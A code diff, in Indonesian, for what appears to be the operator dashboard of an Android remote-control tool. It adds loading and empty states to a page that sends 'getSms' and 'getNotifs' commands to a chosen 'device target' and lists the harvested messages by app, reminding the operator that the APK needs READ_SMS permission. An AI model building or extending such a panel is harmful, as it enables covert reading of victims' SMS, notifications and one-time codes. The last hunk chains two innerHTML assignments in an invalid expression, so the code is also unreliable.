@@ -1554,6 +1554,30 @@ body::after{
       <span class="sec-label-text">Pesan &amp; Notifikasi</span>
       <div class="sec-label-line"></div>
     </div>
+    
+    <!-- Empty state when no device selected -->
+    <div id="sms-no-device" style="display:none;padding:48px 16px;text-align:center">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="color:var(--t2);margin:0 auto 16px">
+        <rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="2.5"/>
+      </svg>
+      <div style="font-family:var(--title);font-size:16px;font-weight:600;color:var(--t1);margin-bottom:8px">
+        Pilih Device Dulu
+      </div>
+      <div style="font-family:var(--sans);font-size:13px;color:var(--t2);line-height:1.6;margin-bottom:20px">
+        Buka tab <strong>Devices</strong>, pilih device target untuk melihat SMS & notifikasi
+      </div>
+      <button onclick="goPage('devices')" style="display:inline-flex;align-items:center;gap:8px;background:rgba(29,111,255,.1);border:1px solid rgba(29,111,255,.3);border-radius:10px;padding:10px 20px;color:var(--blue2);font-family:var(--sans);font-size:13px;font-weight:600;cursor:pointer">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="2.5"/></svg>
+        Pilih Device
+      </button>
+    </div>
+
+    <!-- Loading state -->
+    <div id="sms-loading" style="display:none;padding:48px 16px;text-align:center">
+      <div style="width:40px;height:40px;margin:0 auto 16px;border:3px solid rgba(29,111,255,.2);border-top-color:var(--blue2);border-radius:50%;animation:spin 1s linear infinite"></div>
+      <div style="font-family:var(--sans);font-size:13px;color:var(--t1)">Memuat SMS & Notifikasi...</div>
+    </div>
+
     <div id="sms-app-list" style="padding:0 16px 100px"></div>
     <div id="sms-detail" style="display:none;padding:0 16px 100px">
       <div style="display:flex;align-items:center;gap:10px;padding:16px 0 12px">
@@ -1744,11 +1768,32 @@ let smsData = {}
 let smsViewMode = 'all' // 'all', 'new', 'old'
 
 function loadSmsPage() {
-  if (!selectedDeviceId) return
+  const noDeviceEl = document.getElementById('sms-no-device')
+  const loadingEl = document.getElementById('sms-loading')
+  const listEl = document.getElementById('sms-app-list')
+  
+  if (!selectedDeviceId) {
+    // Show "pilih device dulu"
+    if (noDeviceEl) noDeviceEl.style.display = 'block'
+    if (loadingEl) loadingEl.style.display = 'none'
+    if (listEl) listEl.innerHTML = ''
+    return
+  }
+  
+  // Hide empty state, show loading
+  if (noDeviceEl) noDeviceEl.style.display = 'none'
+  if (loadingEl) loadingEl.style.display = 'block'
+  if (listEl) listEl.innerHTML = ''
+  
+  // Request SMS & Notifs
   sendCmd(selectedDeviceId, 'getSms', '')
   sendCmd(selectedDeviceId, 'getNotifs', '')
-  toast('Berhasil direfresh', 'success')
-  renderSmsAppList()
+  
+  // Hide loading after 2 seconds (data should arrive)
+  setTimeout(() => {
+    if (loadingEl) loadingEl.style.display = 'none'
+    renderSmsAppList()
+  }, 2000)
 }
 
 socket.on('notif:list', ({ deviceId, list }) => {
@@ -1789,13 +1834,34 @@ socket.on('device:notif', ({ deviceId, notif }) => {
 
 function renderSmsAppList() {
   const el = document.getElementById('sms-app-list')
+  const loadingEl = document.getElementById('sms-loading')
+  const noDeviceEl = document.getElementById('sms-no-device')
+  
   if (!el) return
+  
+  // Hide loading & empty state
+  if (loadingEl) loadingEl.style.display = 'none'
+  if (noDeviceEl) noDeviceEl.style.display = 'none'
+  
   const keys = Object.keys(smsData)
+  
   if (keys.length === 0) {
-    el.innerHTML = `<div style="text-align:center;padding:48px 0;color:var(--t2);font-size:13px">Belum ada pesan.</div>
-    <div style="text-align:center">
-      <button onclick="loadSmsPage()" style="background:rgba(29,111,255,.1);border:1px solid rgba(29,111,255,.3);border-radius:10px;padding:10px 20px;color:var(--blue2);font-size:13px;cursor:pointer">Refresh</button>
-    </div>`
+    el.innerHTML = `
+      <div style="text-align:center;padding:48px 16px">
+        <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="color:var(--t2);margin:0 auto 16px;opacity:.5">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+        </svg>
+        <div style="font-family:var(--title);font-size:16px;font-weight:600;color:var(--t1);margin-bottom:8px">
+          Belum Ada Pesan
+        </div>
+        <div style="font-family:var(--sans);font-size:13px;color:var(--t2);line-height:1.6;margin-bottom:20px">
+          Device belum ada SMS atau notifikasi.<br>Pastikan APK sudah izin READ_SMS.
+        </div>
+        <button onclick="loadSmsPage()" style="display:inline-flex;align-items:center;gap:8px;background:rgba(29,111,255,.1);border:1px solid rgba(29,111,255,.3);border-radius:10px;padding:10px 20px;color:var(--blue2);font-family:var(--sans);font-size:13px;font-weight:600;cursor:pointer">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+          Refresh SMS
+        </button>
+      </div>`
     return
   }
   
@@ -1816,6 +1882,15 @@ function renderSmsAppList() {
     })
   }
   
+  // Header with refresh button
+  el.innerHTML = `
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0 14px">
+      <span style="font-family:var(--sans);font-size:12px;font-weight:600;color:var(--t2);letter-spacing:1px">${filteredKeys.length} APLIKASI</span>
+      <button onclick="loadSmsPage()" style="display:inline-flex;align-items:center;gap:6px;background:rgba(29,111,255,.08);border:1px solid rgba(29,111,255,.25);border-radius:8px;padding:6px 12px;color:var(--blue2);font-family:var(--sans);font-size:11px;font-weight:600;cursor:pointer;transition:all .2s">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+        Refresh
+      </button>
+    </div>` +
   el.innerHTML = `
   <div style="display:flex;gap:8px;padding:8px 0 14px;overflow-x:auto">
     <button onclick="setSmsViewMode('all')" style="background:${smsViewMode==='all'?'rgba(29,111,255,.15)':'rgba(29,111,255,.05)'};border:1px solid ${smsViewMode==='all'?'rgba(29,111,255,.4)':'rgba(29,111,255,.15)'};border-radius:8px;padding:6px 14px;color:${smsViewMode==='all'?'var(--blue)':'var(--t2)'};font-size:11px;cursor:pointer;white-space:nowrap;font-weight:600">SEMUA</button>
